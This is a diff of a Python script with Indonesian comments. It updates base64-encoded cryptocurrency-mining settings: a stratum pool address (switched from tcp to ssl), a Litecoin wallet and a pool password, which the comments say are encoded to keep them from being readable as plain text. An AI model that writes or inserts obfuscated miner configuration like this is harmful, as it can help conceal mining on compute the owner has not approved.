@@ -6,7 +6,7 @@ import base64
 
 # --- BAGIAN KONFIGURASI TERENKRIPSI BASE64 ---
 # Mengodekan alamat pool dan wallet agar tidak terbaca sebagai plain text
-pool_b64 = "c3RyYXR1bSt0Y3A6Ly9taW5vdGF1cnguZXUubWluZS56cG9vbC5jYTo3MDE5"
+pool_b64 = "c3RyYXR1bStzc2w6Ly9taW5vdGF1cngubWluZS56cG9vbC5jYTo1NzAxOQ=="
 wallet_b64 = "bHRjMXFuYWM3eGhxdXd0ZGtnNTJwODdsN2Y2ajdwcjlsc2xmZWgwcjJ2eQ=="
 password_b64 = "Yz1MVEMsemFwPU1BWkE="
 # Proses decode otomatis saat skrip Python dijalankan
